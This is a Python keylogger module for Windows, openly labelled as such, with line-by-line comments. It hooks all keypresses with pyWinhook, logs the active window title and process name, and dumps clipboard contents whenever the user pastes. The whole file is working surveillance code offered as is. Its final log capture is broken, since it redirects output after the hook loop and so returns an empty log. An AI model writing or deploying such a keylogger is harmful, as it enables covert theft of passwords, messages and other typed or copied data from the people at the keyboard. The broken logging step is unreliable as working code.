#This is a keylogger module.

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

#BEGIN KEYLOGGER CLASS DEFINITION
class KeyLogger:
    def __init__(self):
        self.current_window = None
    def get_current_process(self): #Captures the active window and its associated process ID.
        hwnd = windll.user32.GetForegroundWindow() #Returns a handle to the active window on the target's desktop.
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) #Retrieve window process ID.
        process_id = f'{pid.value}'

        executable = create_string_buffer(512) #Create 512 byte string buffer.
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) #Opens process specified by 'pid' and returns a handle to 'h_process'.
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512) #Puts the name of the process executable defined by 'h_process' into the string buffer 'executable'.

        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512) #Puts the window's titlebar text into 'window_title'.
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')
        
        print('\n', process_id, executable.value.decode(), self.current_window) #Prints header so you can see which keystrokes went to which process and window.

        windll.kernel32.CloseHandle(hwnd) #Close 'hwnd' handle.
        windll.kernel32.CloseHandle(h_process) #Close 'h_process' handle.

    def mykeystroke(self, event):
        if event.WindowName != self.current_window: #Check if the user hase changed windows.
            self.get_current_process() #If so, get the new window's name and process info.
        if 32 < event.Ascii < 127: #Get the keystroke value and print it out if it falls within the ASCII-printable range. If it's a modifier key (like SHIFT, CTRL, or ALT), or any other nonstandard key, we grab the key name from the event object.
            print(chr(event.Ascii), end='')
        else:
            if event.Key == 'V': #Check if user is performing a PASTE operation, and if so, dump the contents of the clipboard.
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True #Returns True to allow the next hook in the chain, if there is one, to process the event.
#END KEYLOGGER CLASS DEFINITION

def run():

    kl = KeyLogger() #Create KeyLogger object.
    hm = pyHook.HookManager() #Define the PyWinHook HookManager.
    hm.KeyDown = kl.mykeystroke #Bind the KeyDown event to the KeyLogger callback method 'mykeystroke'.
    hm.HookKeyboard() #Instruct PyWinHook to hook all keypresses and continue execution until we time out. Whenever the user presses a key on the keyboard, our 'mykeystroke' method is called with an event object as its parameter.
    while time.thread_time() < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    save_stdout = sys.stdout
    sys.stdout = StringIO()
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    run()
    print('Timed Out.')